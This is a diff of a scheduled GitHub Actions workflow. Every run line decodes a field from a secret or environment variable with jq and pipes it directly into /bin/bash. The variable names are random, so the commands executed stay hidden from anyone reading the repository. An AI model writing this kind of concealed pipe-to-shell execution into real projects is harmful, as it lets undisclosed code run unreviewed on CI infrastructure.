@@ -1,23 +1,26 @@
 name: wobunengsizaizheli
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 2/6 * * *'
+    - cron: '57 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wobunengsizaizheli
         env:
-          wdj99: ${{ secrets.wdj99 }}
+          h4: ${{ secrets.h4 }}
         run: |
-          echo $wdj99 | jq -r .pyfp50725 | /bin/bash
-          echo $lyw7 | jq -r .r1155 | /bin/bash
-          echo $x08355 | jq -r .erz6398 | /bin/bash
-          echo $bth10 | jq -r .e43 | /bin/bash
-          echo $ipj0691 | jq -r .pt025 | /bin/bash
-          echo $xivh2 | jq -r .ywf5666 | /bin/bash
+          echo $h4 | jq -r .ravv74172 | /bin/bash
+          echo $dls70 | jq -r .rffpg3629 | /bin/bash
+          echo $jkdas357 | jq -r .yqo49634 | /bin/bash
+          echo $cnmvt3957 | jq -r .io015 | /bin/bash
+          echo $egf820 | jq -r .ka6454 | /bin/bash
+          echo $bolp550 | jq -r .m1 | /bin/bash
+          echo $cecb59 | jq -r .fpf76 | /bin/bash
+          echo $zrj2007 | jq -r .pqow53 | /bin/bash
+          echo $ggnil0 | jq -r .b3098 | /bin/bash
+          echo $pdhu24 | jq -r .kazb965 | /bin/bash
+          echo $e9270 | jq -r .vz69 | /bin/bash
 
